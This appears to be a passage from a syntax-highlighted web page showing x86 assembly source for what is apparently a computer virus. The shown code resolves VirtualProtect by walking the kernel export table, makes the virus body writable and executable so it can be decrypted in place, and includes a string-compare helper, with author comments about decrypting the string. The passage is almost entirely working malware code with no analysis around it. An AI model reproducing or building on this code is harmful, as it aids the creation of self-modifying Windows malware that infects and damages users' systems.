                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">compara</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">VPfinality</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">     
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">VPrepeat</span><span class="sc0">        </span><span class="sc1">;edx index ordinal</span><span class="sc0">

</span><span class="sc5">VPfinality</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">      
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;eax -&gt; ordinal</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">     </span><span class="sc1">;add index</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;index for export address table</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0"> 
                
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">         
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;array of dirs of func</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">;we index it in eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;dir of VirtualProtect</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">repuse2</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc0">       </span><span class="sc1">;lpflOldProtect is a stack dword</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">;writable,readable and executable</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">sizeVir</span><span class="sc0">       </span><span class="sc1">;size of memory to put writable</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">startVir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;this useful ritune compare 2 strings and return 0 if they are identical and 1 if not.</span><span class="sc0">

</span><span class="sc5">compara</span><span class="sc4">:</span><span class="sc0"> 
                        
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">     
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">     
                </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">           

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">endString</span><span class="sc4">:</span><span class="sc0">          
                </span><span class="sc6">lodsb</span><span class="sc0">                 </span><span class="sc1">;lenght of string</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">endString</span><span class="sc0">
    
                </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;ecx = lenght   esi = start</span><span class="sc0">
                      
                                </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                
                </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">cmpsb</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">endCompara</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">endCompara</span><span class="sc4">:</span><span class="sc0">         
                </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">ECX</span><span class="sc0">
            
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;arrrggghtt!! damn,i have had headache becoz i was using VP string before decrypt it!! ;@</span><span class="sc0">

                </span><span class="sc5">VP</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VirtualProtect'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">kern</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">endVir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
